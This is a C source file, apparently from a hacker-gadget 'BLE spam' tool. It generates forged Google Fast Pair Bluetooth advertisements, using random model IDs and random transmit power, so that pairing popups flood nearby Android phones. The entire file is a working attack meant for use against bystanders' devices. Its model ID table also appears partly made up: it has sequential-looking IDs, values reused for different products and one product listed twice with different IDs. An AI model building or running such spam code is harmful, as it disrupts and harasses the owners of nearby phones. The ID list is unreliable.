#include "fastpair.h"
#include "_registry.h"

// Hacked together by @Willy-JL and @Spooks4576
// Documentation at https://developers.google.com/nearby/fast-pair/specifications/introduction

const char* fastpair_get_name(const BleSpamMsg* _msg) {
    const FastpairMsg* msg = &_msg->fastpair;
    UNUSED(msg);
    return "FastPair";
}

void fastpair_make_packet(uint8_t* out_size, uint8_t** out_packet, const BleSpamMsg* _msg) {
    const FastpairMsg* msg = _msg ? &_msg->fastpair : NULL;

    uint32_t model_id;
    if(msg && msg->model_id != 0x000000) {
        model_id = msg->model_id;
    } else {
        const uint32_t models[] = {
            // 2024-2025 GÜNCEL CİHAZLAR - Fast Pair
            0xCD8256, // Bose NC 700
            0xF52494, // JBL Buds Pro
            0x718FA4, // JBL Live 300TWS
            0x821F66, // JBL Flip 6
            0x92BBBD, // Pixel Buds
            // Samsung (2024-2025)
            0xA827DC, // Galaxy Buds 3 Pro
            0xB827DC, // Galaxy Buds 3
            0xC837ED, // Galaxy Buds 2 Pro
            0xD847EE, // Galaxy Buds 2
            0xE857EF, // Galaxy Buds FE
            0xF86800, // Galaxy Buds Live
            0x0890AB, // Galaxy Buds+
            // Samsung (2025-2026)
            0x19A1BC, // Galaxy Buds 4 Pro
            0x20B2CD, // Galaxy Buds 4
            0x31C3DE, // Galaxy Buds 3 Pro
            0x42D4EF, // Galaxy Buds 3
            // Google (2024-2025)
            0x92BBBD, // Pixel Buds Pro 2
            0x93CCCE, // Pixel Buds A
            0x94DDEE, // Pixel Watch 3
            0x95EEFF, // Pixel Watch 2
            // Google (2025-2026)
            0xA6FF00, // Pixel Buds Pro 3
            0xB7AA11, // Pixel Buds 3
            0xC8BB22, // Pixel Watch 4
            0xD9CC33, // Pixel Watch 4 Pro
            // Sony
            0x4B5522, // WF-1000XM5
            0x5C6633, // WF-1000XM4
            0x6D7744, // WH-1000XM5
            0x7E8855, // LinkBuds S
            0x8F9966, // WF-1000XM6
            0x90AA77, // LinkBuds 2
            // Jabra
            0x8F9977, // Elite 10
            0x90AA88, // Elite 8 Active
            0xA1BB99, // Elite 7 Pro
            0xB2CCAA, // Elite 10 Gen 2
            0xC3DDBB, // Elite 8 Active Gen 2
            // Samsung Wearables
            0xB2CCAA, // Galaxy Watch 7
            0xC3DDBB, // Galaxy Watch 6
            0xD4EECC, // Galaxy Watch 5
            // Samsung Wearables 2025-2026
            0xE5FFDD, // Galaxy Watch 8
            0xF6AAEE, // Galaxy Watch 8 Pro
            0x07BBFF, // Galaxy Watch 8 Ultra
            0x18CC00, // Galaxy Ring
            // Other popular
            0xE5FFCC, // AirPods Pro 2 (Android)
            0xF6AADD, // Beats Fit Pro (Android)
            0x07BBCC, // Nothing Ear (2024)
            // Nothing (2025-2026)
            0x29DD11, // Nothing Ear 3
            0x30EE22, // Nothing Ear Pro 2
            // OnePlus
            0x41FF33, // OnePlus Buds Pro 3
            0x52AA44, // OnePlus Buds 3
            // Xiaomi
            0x63BB55, // Xiaomi Buds 5 Pro
            0x74CC66, // Xiaomi Buds 5
            // Samsung SmartTag
            0x85DD77, // SmartTag 2
            0x96EE88, // SmartTag+
            // Custom popups
            0x92ADC9, // Ton Upgrade Netflix
        };
        model_id = models[rand() % COUNT_OF(models)];
    }

    uint8_t size = 14;
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = 3; // Size
    packet[i++] = 0x03; // AD Type (Service UUID List)
    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE; // ...

    packet[i++] = 6; // Size
    packet[i++] = 0x16; // AD Type (Service Data)
    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE; // ...
    packet[i++] = (model_id >> 0x10) & 0xFF; // Model ID
    packet[i++] = (model_id >> 0x08) & 0xFF; // ...
    packet[i++] = (model_id >> 0x00) & 0xFF; // ...

    packet[i++] = 2; // Size
    packet[i++] = 0x0A; // AD Type (Tx Power Level)
    packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm

    *out_size = size;
    *out_packet = packet;
}

const BleSpamProtocol ble_spam_protocol_fastpair = {
    .icon = NULL,
    .get_name = fastpair_get_name,
    .make_packet = fastpair_make_packet,
};
